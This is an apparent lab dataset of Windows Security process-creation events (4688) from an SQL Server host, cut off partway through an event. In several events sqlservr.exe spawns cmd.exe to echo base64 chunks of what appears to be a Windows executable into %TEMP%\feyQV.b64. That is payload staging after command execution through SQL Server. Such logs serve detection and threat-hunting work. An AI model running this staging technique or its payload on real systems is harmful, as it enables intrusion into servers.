<root>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:09.443226500Z" />
      <EventRecordID>1331261</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x414</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACTOPDW11mehddZnoXXWZ6FrEWShdNZnoVURZCF3lmehbhGlIXcWZ6FuEaahdRZnoXXWZ+FHlmehVRRw4XfWZ6Fg3quhf9ZnoUQX5iF1lmehVJpY2jXWZ6FAAAAAAAAAAAAAAAAAAAAAFBFAABMAQQALVO2SgAAAAAAAAAA4AAPAQsBBgAAsAAAAKAAAAAAAADmNAAAABAAAADAAAAAAEAAABAAAAAQAAAEAAAAAAAAAAQAAAAAAAAAAGABAAAQAAAAAAAAAgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAbMcAAHgAAAAAUAEAyAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAODBAAAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAADgAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAABmqQAAABAAAACwAAAAEAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAA5g8AAADAAAAAEAAAAMAAAAAAAAAAAAAAAAAAAEAAAEAuZGF0YQAAAFxwAAAA0AAAAEAAAADQAAAAAAAAAAAAAAAAAABAAADALnJzcmMAAADIBwAAAFABAAAQAAAAEAEAAAAAAAAAAAAAAAAAQAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:09.445979100Z" />
      <EventRecordID>1331262</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x1274</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x414</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:09.721160000Z" />
      <EventRecordID>1331263</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x8f4</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:09.723520800Z" />
      <EventRecordID>1331264</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xe20</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x8f4</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:09.995454600Z" />
      <EventRecordID>1331265</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x106c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:09.997727200Z" />
      <EventRecordID>1331266</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="3644" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x7c8</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x106c</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:10.269471500Z" />
      <EventRecordID>1331267</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xc48</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFWL7IHsEQQA5bjUAuwAH1ajfhfFABqpn0EAo0RAQQCjBBgDADMKxUhPjgBXjUUM5iGOc6pRx+HwF0EARNJABJUdQDxBUG7WTAAAaOBfQADo2KQAAIPEBFNTU2hMQKcA6Ds+ANSLVQyGIgiLYEx+QQBSUI1V9FFS6GRKAACLVfSNRfyNTftQUWgU0kABUujeSgA3hcAPhZoEPEqLNWj6QKoPvkX7g8Bag/g5D4dmBAAAM7iKiAgXQAD/JLaYFkAAi1X8UsAVbMFAs4PEBDvDoxBUnnAPsT0E0C1o+M9AE+htLAAA6SuTAADHBdQCQQABAAAA6R8Efk+JHRRZQADpFAQrAItF/FD/FVOh2ACjGPpAq+kWMgAAi02l2v8LbMGPAKOoAkEA6enPAAA5HWACLAB+DWgc0UAAzhQLAABuxATHJmACZAD/////6USc&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:10.271684500Z" />
      <EventRecordID>1331268</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0xc2c</Data>
      <Data Name="NewProcessName">C:\Windows\System32\conhost.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0xc48</Data>
      <Data Name="CommandLine">\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:10.544417100Z" />
      <EventRecordID>1331269</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x1184</Data>
      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x1050</Data>
      <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c echo AACLVfxS/xWIwUA6o7gL2wDpsQMAACYdHNDmAOmpLAAAi0X8UP8ViMFAAFgvFygA6ZIWAACJHSDQQADpGAMAANYdYGnAm3QNaLzRQABM4AUAAIPEBIv2/AirhjUABYMxGzt8dVbHBTsCQQABAAAA6SukHgA5HSA4QQAPhEoDAABQ/xVwV0DsOR1gAkEAdFBuoDNAEug2BQAYg8QEi1X8Ujc/NQAAg8QEO8N1D8fnYOBBAAIAAADpDwMqADkdAjhBAA+EAwMAAFAMFXDBfQDH+FxlQQBUAAAA6e17/gCLSfxQNxVsFkAAllgCpADp1gIAiotu/FH/FWyMQACjZBoyAD5pENBAAN7DAABPuAIAAItF/LqVrkGDudCKCIgMVkA6H3X26aIXAC2LVVuhkiNhMVNonNFAAKpokNFMAFDoXkYAAIPEFCFEQEFz6XsCAK6LjPyLDXTB4q+DOQF+ETPSqAiKF1L/Oo0Yg4PECOsSiw1DwUDTM8CKB4sRigRCg/jAO8N0BkeYffzryIPJ/zNR8v730Uka6MqgAAA9AAQAhHYNaGjRQL/oWQQAm4PEBItV/Bfq/4v6M8DyrvfRI42F9Pv//1FSUHB4oAAAU/+N9Ir//2ic0UAAkGhQ0UAa6Y4A+7WLfe+LDXTBQACRzgF+ETPSTMeKF3D/+o99/IPESOsSoA149kAA/NmKHYsRihVCgwEIrcN0BkeaffzryIP3TTPA8q73tElR6OugAJI9AFAJAHYNaDTRQADoEwMMHYOdpItS/IOe/4v6yMDyrvf8SaKF9ML///VSUOc2oE0AU42N9Pv/UGiW0UAAUWiF0YkAixUEGEEAiJwF9Pv/G6FMQEEAUlDou0QAAIPEGKMEGEFe6V0BAACLTfyLFUhAwgChTEBBAFNonDtAAFFSUBWSRAAAi022iz2MwXoApAVoENFAAFGjSEBBAP8Ag/wghcB1D8fCfDpBlIsAAADp6gAAS4tV/GoHCwjRQABS/ziDxAyFwM0PSQWEAkEAagAAyenHAAAxHkX8agto/NCOAFD/1wHEDIV7DxfWAAAAxwWAAgwAAQAAxOmghwAAx4GIQ7GFUAAAAOmRAAAAi038x6iIYkEAIioAzokN6JEqG9NHi1XKgTrqXrh8wUAAg8QIwcPgErQY/1D/FbjBJwCDxASjdAJBAIvMK7pAPJ4AK9CKygoMAnA6y3X2Ga54AkEAAQAAAOvQvkX8xwWIDkEAAQAAAFOoFEEA6yOLTfzHBYgCQQCpAAAAhIO1F0FlsQ6LVQyLAlCO/S0AAIPEFotF9I0V/I1V+1FSaBTSQABQ6ERGAACFwA+ER/v//4tF9ItNCN81gHJAAEk5SHW+1ouGDIsWyMBAACbZQIsCUNvc0EAAokvWi1XTiwJQ6GstAACLRfSDxECLSKZ8UByLFIpBiUgyoUxAYACzUOjJK7Qrs+iaLwAAg8QEhcB0U4tqPaHIwEAAZMBA&gt;&gt;%TEMP%\feyQV.b64</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2020-08-01T22:58:10.546960500Z" />
      <EventRecordID>1331270</EventRecordID>
      <Correlation />
      <Execution ProcessID="4" ThreadID="924" />
      <Channel>Security</Channel>
      <Computer>mssql01.offsec.lan</Computer>
      <Security />
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-4230534742-2542757381-3142984815-1171</Data>
      <Data Name="SubjectUserName">Svc-SQL-DB01</Data>
      <Data Name="SubjectDomainName">OFFSEC</Data>
      <Data Name="SubjectLogonId">0x1304385</Data>
      <Data Name="NewProcessId">0x102c</Data>
